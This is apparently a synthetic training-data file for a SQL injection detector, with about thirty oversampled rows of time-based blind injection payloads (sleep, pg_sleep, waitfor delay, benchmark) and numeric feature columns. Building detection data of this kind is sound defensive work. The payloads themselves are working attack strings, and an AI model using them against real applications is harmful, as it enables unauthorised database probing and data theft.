id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000264,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""twmy""  =  ""twmy",nearest_attack_euclidean,R000082,0.6738550570965267,85.5595950145584,25.8601012463604,3.655913059253484,29.880809970883192,10.0,34.11919002911681,11.559595014558404,0.34983759445786655,0.11690734300785406,0.3983694007923994,0.13488566174188,0.0,3.9999999999999996,0.0,0.0,0.0,2.0,0.0,4.279797507279202,0.2797975072792025,1.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000265,attack,time,"1"" where 7739  =  7739 and sleep  (  5  )  --",nearest_attack_euclidean,R000069,1.520955692311581,50.8606104647707,21.781414728636094,3.613931879295396,16.12565891454437,10.0,18.34424418590828,6.390707364318047,0.31276545004165834,0.2005162575378863,0.35989674849242276,0.12682154392803258,0.3907073643180464,0.6092926356819536,2.0,0.0,0.0,1.0,0.0,2.3907073643180463,0.0,0.0,0.0,3.0,0.39070736431804653,0.6092926356819536,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.6092926356819536,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6092926356819537
SMOTE_000266,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,0.03731078923290512,72.93351329678264,24.962007598161502,3.5411268510156537,16.04749050229812,17.924015196323005,29.981003799080753,8.981003799080751,0.22011842962209233,0.24567245122239353,0.41108507231826813,0.12312404683724598,1.0,1.1102230246251565e-16,0.0,0.0,0.0,1.9905018995403756,0.0,4.0,0.0,0.0,0.9905018995403756,1.9905018995403756,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.9905018995403756,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.9905018995403756
SMOTE_000267,attack,time,1   )    )    or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000033,0.015214816020800754,40.92283999597892,16.0,2.892476482548397,11.0,1.0,19.93386285369622,8.988977142282703,0.2689015495295781,0.02444559541177982,0.4869666980501912,0.2196861570084509,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,3.988977142282703,0.0,4.0,0.0,2.220446049250313e-16,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000268,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,5.179889098257095,29.138573572459677,20.615477977049732,4.209030987973712,14.092382381639787,2.9538088091801074,2.476904404590055,9.615477977049734,0.48165752290038255,0.10606338311159141,0.08772090601197396,0.32455818797605207,2.4769044045900532,0.5230955954099467,2.0,0.0,0.0,0.0,0.5230955954099468,0.0,0.0,2.092382381639787,0.0,2.0,1.0,0.5230955954099468,1.0,0.0,0.0,0.0,0.0,0.5230955954099468,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000269,attack,time,"1'   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000109,0.12202926384213537,79.94310854409414,23.943108544094148,3.390851358432251,17.0,19.0,34.0,9.943108544094146,0.2126530308149366,0.2376710344402233,0.4253060616298733,0.12436987311496682,0.9431085440941468,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,6.0,0.0,0.0,1.0,1.0,0.9431085440941468,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000270,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'pgth'  =  'pgth,nearest_attack_euclidean,R000256,1.0771242258697649,93.94460000624736,22.563514286606765,3.1124185915961955,32.508114292854124,1.0,46.0,14.436485713393235,0.34493487814226176,0.010659266895046121,0.49032627717212157,0.15407957779057052,3.0,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,9.0,0.43648571339323483,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000271,attack,time,1   )    )    as ewlg where 3722  =  3722 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000276,0.7062117496160903,65.7615332566774,21.23846674332261,3.3292044340868374,20.52306651335478,10.0,28.0,7.23846674332261,0.3120116996482961,0.15207101804970308,0.42579885053916855,0.1101184317628323,0.0,0.23846674332261025,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,3.0,0.0,0.2384667433226102,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.23846674332261014,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2384667433226104
SMOTE_000272,attack,time,1' and sleep  (  5  )   and 'usgv' like 'usgv,nearest_attack_euclidean,R000190,0.48989647932172725,47.14252046800959,18.178543372334133,3.553726426276972,23.5356301170024,1.8214566276658672,15.606890351007197,6.178543372334134,0.5012964461991762,0.03964152331732741,0.3276081010694696,0.13145392941402667,3.8214566276658664,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,2.3570867446682655,0.0,0.0,0.0,2.220446049250313e-16,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.17854337233413298,0.0,2.7755575615628914e-17,0.0,1.8214566276658668,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000273,attack,time,"1"" where 3227  =  3227 waitfor delay '0:0:5'--",nearest_attack_euclidean,R000188,2.3820470541564744,36.84508714463,20.7957805006205,4.104449521029224,14.7112717861575,8.7957805006205,6.253526143388999,7.084508714463,0.411665569150949,0.2294856666329289,0.15891004874098996,0.19993871547513212,2.0,0.5422543572315,2.0,0.0,0.0,0.5422543572315,0.0,0.0,0.0,0.0,0.0,2.5422543572315,1.0,0.5422543572315,1.0,0.0,0.0,0.5422543572315,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.5422543572315,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.5422543572315
SMOTE_000274,attack,time,select sleep  (  5  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R000193,0.9763805156131702,55.46020845044437,17.230515895322736,2.8567992273143816,16.15340281681479,1.3076289738306839,28.383918712137525,9.615257947661368,0.29010898534043833,0.02291942019453619,0.5114597100972681,0.17551188436775736,3.307628973830684,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,4.615257947661368,0.6923710261693159,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.6923710261693159,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6923710261693157
SMOTE_000275,attack,time,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000306,0.18950244569401653,80.05273500670273,18.93420406208108,2.9516222845333573,27.0,2.0,39.921143130864884,11.13159187583784,0.3379848307553666,0.025035913389286416,0.4978965545738734,0.1390827012814736,0.9342040620810796,1.1102230246251565e-16,0.0,0.0,1.0,0.0,0.0,8.197387813756762,0.0,0.0,0.0,1.0,0.9342040620810795,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000276,attack,time,1' in boolean mode  )   and sleep  (  5  )  #,nearest_attack_euclidean,R000303,0.1664457378172699,44.45787199051438,18.038723429248975,3.398329416926378,20.883829712253082,1.9612765707510267,16.651489136759245,4.961276570751027,0.4710803048391302,0.043972546023489226,0.3731420697601588,0.11180507937722173,0.9612765707510271,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,2.9612765707510267,0.0,0.03872342924897293,0.0,2.220446049250313e-16,0.9612765707510269,0.0,0.0,0.9612765707510269,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.9612765707510271,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9612765707510271
SMOTE_000277,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'qfsu'  =  'qfsu",nearest_attack_euclidean,R000269,0.855177033805721,81.74166253949556,28.303334984201776,3.863063781248845,28.213339936807103,15.0,28.483325078991122,10.044997523697337,0.3467758317970891,0.18365809733934801,0.34707712394586776,0.12248894691769513,3.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,4.696665015798224,0.3483325078991121,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000278,attack,time,"1%""   )    )    rlike sleep  (  5  )  #",nearest_attack_euclidean,R000170,0.12651760413686022,38.7473166304807,14.968414578810087,2.779541984585516,10.000000000000002,2.0,19.810487472860526,6.936829157620175,0.25850027600925807,0.05170005520185161,0.5108872446914362,0.17891242409745403,0.0315854211899127,0.9684145788100875,0.0,0.0,0.0,0.0,0.0,3.9684145788100875,0.9684145788100875,0.0,0.0,2.220446049250313e-16,0.03158542118991248,0.9684145788100875,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000279,attack,time,sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000041,1.186680496826791,25.771168437315566,14.062701062389342,3.2389176786226366,9.708467374926228,0.0,8.708467374926226,7.354233687463115,0.37652686934251345,0.0,0.3374049849133691,0.2860681457441175,0.0,0.3542336874631139,0.0,0.0,0.0,0.0,0.0,1.9999999999999996,0.0,4.0,0.0,2.220446049250313e-16,0.0,0.35423368746311396,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.35423368746311384,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.354233687463114
SMOTE_000280,attack,time,"1""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   ""dyoe""  =  ""dyoe",nearest_attack_euclidean,R000176,0.028902569545593528,123.75086826798196,23.009581989693,2.9668448420541957,38.97125403092099,1.990418010306998,64.82752418552596,17.96167204122799,0.31502235330669087,0.016072259442240278,0.5237661752457532,0.14513921200531568,0.0,3.990418010306998,0.0,0.0,1.0,1.0,0.0,11.971254030920994,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,2.7755575615628914e-17,1.0,1.990418010306998,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.990418010306998
SMOTE_000281,attack,time,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  -- ybmz,nearest_attack_euclidean,R000150,0.8390266963925713,88.2296858960437,23.759926093186756,3.27051746520187,32.56994456989007,3.519852186373509,40.94990761648344,11.189981523296689,0.37013787079207117,0.03768489781426308,0.46500054343245034,0.12717668796121545,0.0,1.1102230246251565e-16,2.0,0.0,1.0,0.1899815232966886,0.0,8.0,0.0,0.0,0.0,3.189981523296689,0.0,0.0,1.0,0.0,0.0,0.1899815232966886,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.18998152329668871,1.0,0.8100184767033112,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000282,attack,time,"1""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   ""dyoe""  =  ""dyoe",nearest_attack_euclidean,R000176,0.8288471535783605,126.54963216077225,23.566584924616055,2.947143625607886,38.716707537691974,2.0,67.26633969846424,18.56658492461606,0.3063567839196996,0.015819836022220188,0.53118481883091,0.14663856122717017,0.0,3.9999999999999996,0.0,0.0,1.0,1.0,0.0,12.566584924616055,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,2.7755575615628914e-17,1.0,1.7167075376919716,0.2832924623080283,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000283,attack,time,select pg_sleep  (  5  )   and 'rpka'  =  'rpka,nearest_attack_euclidean,R000241,0.3053453110090788,48.543188718466894,18.691362256306622,3.5458661624737102,24.0,1.0,16.234550974773512,7.308637743693378,0.49548423517053786,0.02064517646543909,0.3334190118810768,0.15045157648294621,3.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,2.3086377436933776,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000284,attack,time,1'  )   as inid where 7812  =  7812 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000136,1.0412631916748762,100.6300140177056,30.684992991147197,3.720190042819339,30.0,18.0,41.630014017705605,11.0,0.29838104194160436,0.17902862516496262,0.41318395084817805,0.10940638204525494,0.5616643303823986,1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,5.438335669617602,0.0,1.0,0.0,4.0,0.5616643303823986,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000285,attack,time,select sleep  (  5  )  #,nearest_attack_euclidean,R000271,0.9218476144135445,24.71315936166141,11.95087914888188,2.9861277349800637,10.76228021277953,1.2377197872204695,9.23771978722047,3.47543957444094,0.43742279649449567,0.04937054865992264,0.37389944542953485,0.1393072094160468,0.23771978722047016,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,1.9999999999999996,0.23771978722046994,0.0,0.0,2.220446049250313e-16,0.2377197872204701,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.76228021277953,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.7622802127795298
SMOTE_000286,attack,time,"1""   )    )    rlike sleep  (  5  )   and    (    (   ""ahhx"" like ""ahhx",nearest_attack_euclidean,R000272,1.2149273595084893,63.85739216979927,18.420153401776513,3.15648282715268,23.73953979467046,2.0,28.95815917868184,9.159693196446973,0.37534494553380826,0.03189494409504472,0.4488466269987572,0.14391348337238977,0.0,3.9999999999999996,0.0,0.0,0.0,0.0,0.0,5.159693196446973,0.0,0.0,0.0,2.220446049250313e-16,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,1.0,0.42015340177651345,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4201534017765134
SMOTE_000287,attack,time,"1   )    )    as dhge where 4816  =  4816 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000295,2.5726722594896843,108.4676146938807,29.467614693880694,3.767165762068334,26.532385306119306,29.0,42.0,10.93522938776139,0.24463744617109295,0.26736656251082735,0.3872205388087845,0.1007754525092952,0.4676146938806952,1.1102230246251565e-16,0.9352293877613904,0.0,0.0,2.0,0.0,6.0,0.0,0.0,1.0,2.9352293877613906,0.4676146938806952,0.0,0.4676146938806952,0.5323853061193049,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.5323853061193048,0.46761469388069515,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000288,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000071,0.455361098887535,70.78745169252525,23.787451692525245,3.428228778417942,19.0,10.0,31.0,10.787451692525247,0.26841819272475254,0.14127273301302767,0.4379454723403858,0.15236360192183396,0.0,1.0,2.0,0.0,0.0,1.0,0.0,5.0,0.7874516925252462,1.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000289,attack,time,begin dbms_lock.sleep  (  5  ) ,nearest_attack_euclidean,R000140,1.429586052151654,30.683133881258257,17.415669406291293,3.645490624205999,17.049401643774775,1.0,8.633732237483486,4.0,0.5550914420369564,0.03259878077284058,0.28191465409884076,0.13039512309136234,0.0,1.1102230246251565e-16,0.633732237483483,0.0,0.0,0.0,0.0,1.9999999999999996,0.0,0.6831338812582585,0.0,0.6337322374834831,0.0,0.0,0.3168661187417415,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.31686611874174153,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3168661187417416
SMOTE_000290,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,0.354877531754984,74.99391713340597,25.0,3.5257039250575977,16.598175140021795,18.0,31.196350280043585,9.199391713340598,0.22091090161836724,0.2412887747236253,0.4150119393785539,0.12278838427945349,0.9003041433297012,0.0996958566702989,0.0,0.0,0.0,2.0,0.0,4.199391713340598,0.0,0.0,1.0,2.0,0.9003041433297011,0.09969585667029893,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000291,attack,time,1  )   as xylu where 3338  =  3338 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R000212,0.9602137833713347,118.35556484999044,30.419445606248807,3.4327351384807394,41.0,10.0,53.51667363749283,13.838891212497611,0.34679546420292623,0.08458425956168933,0.45184048504504515,0.11677979119033931,0.41944560624880545,1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,9.419445606248804,0.0,0.0,0.0,4.0,0.41944560624880534,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000292,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and 'mabd'  =  'mabd,nearest_attack_euclidean,R000197,0.14622441273870054,100.63714629019381,26.318573145096902,3.417608207572961,40.318573145096906,1.8637146290193805,44.59114388705814,13.86371462901938,0.4005084679136763,0.018416943689214538,0.44326780620430617,0.13780678219280304,3.8637146290193805,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,8.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000293,attack,time,"1'  )   as xvcr where 6456  =  6456 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000078,1.3313400650135498,105.85968874643294,30.0,3.844344905300732,26.0,29.52338520892785,38.85968874643294,11.476614791072157,0.24580458649619163,0.27924806396424506,0.36658048864442927,0.10836686089513403,1.0,1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,5.476614791072157,0.0,0.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.5233852089278433,0.4766147910721566,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
